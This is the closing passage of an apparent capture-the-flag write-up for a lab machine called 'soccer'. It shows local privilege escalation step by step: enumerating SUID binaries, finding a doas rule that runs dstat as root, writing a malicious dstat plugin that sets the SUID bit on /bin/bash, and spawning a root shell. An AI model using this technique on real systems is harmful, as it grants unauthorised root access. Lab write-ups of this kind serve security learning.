+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>player@soccer:~$ find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/local/bin/doas
+</span></span><span style="display:flex;"><span>/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/at
+</span></span><span style="display:flex;"><span>/snap/snapd/17883/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/mount
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/su
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/bin/umount
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/snap/core20/1695/usr/lib/openssh/ssh-keysign
+</span></span></code></pre></div><p>Let&rsquo;s find the <code>doas.conf</code> so we can find what we can do with this <code>doas</code> binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>player@soccer:~$ find / -name doas.conf -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/local/etc/doas.conf
+</span></span></code></pre></div><p>We can run <code>/usr/bin/dstat</code> as the <code>root</code> user with no password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>player@soccer:~$ cat /usr/local/etc/doas.conf
+</span></span><span style="display:flex;"><span>permit nopass player as root cmd /usr/bin/dstat
+</span></span></code></pre></div><p>According to this <a href="https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/">artcle</a>, we can use dstat with custom malicious plugin to elevate our privileges.</p>
+<p>First we have to find a writable path, so we can create a custom plugin in that directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>player@soccer:~$ find / -name dstat 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/share/doc/dstat
+</span></span><span style="display:flex;"><span>/usr/share/dstat
+</span></span><span style="display:flex;"><span>/usr/local/share/dstat
+</span></span><span style="display:flex;"><span>/usr/bin/dstat
+</span></span></code></pre></div><p><code>/usr/local/share/dstat</code> is writable directory. So we can create a custom plugin within that directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ pwd
+</span></span><span style="display:flex;"><span>/usr/local/share/dstat
+</span></span><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ touch test
+</span></span><span style="display:flex;"><span>player@soccer:/usr/local/share/dstat$ ls
+</span></span><span style="display:flex;"><span>test
+</span></span></code></pre></div><p>Now create the custom plugin. <code>dstat_exploit.py</code> will be looks like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;chmod u+s /bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Now run the <code>/usr/bin/dstat</code> and get a root shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;   doas -u root /usr/bin/dstat --exploit
+</span></span><span style="display:flex;"><span>&gt;   ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span><span style="display:flex;"><span>&gt;   bash -p
+</span></span><span style="display:flex;"><span>bash-5.0# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>player<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>player<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>player<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash-5.0# cat /root/root.txt
+</span></span><span style="display:flex;"><span>32b**************************f67
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
